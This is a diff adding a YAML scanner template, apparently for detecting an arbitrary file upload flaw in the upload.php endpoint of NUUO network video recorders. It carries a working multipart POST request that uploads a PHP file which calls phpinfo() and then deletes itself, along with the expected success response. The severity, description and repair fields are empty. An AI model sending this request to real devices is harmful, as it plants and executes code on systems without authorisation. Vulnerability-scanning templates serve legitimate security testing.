@@ -1,0 +1,26 @@
+id:
+info:
+  name: NUUO网络视频录像机 upload.php 任意文件上传
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /upload.php
+  headers:
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
+    Connection: keep-alive
+    Content-Type: multipart/form-data; boundary=--------ok4o88lom
+  data: |
+    ----------ok4o88lom
+    Content-Disposition: form-data; name="userfile"; filename="test.php"
+
+    <?php phpinfo();@unlink(__FILE__);?>
+    ----------ok4o88lom--
+response1:
+  headers:
+  body: test.php
+  code: 200
+requests2:
+response2:
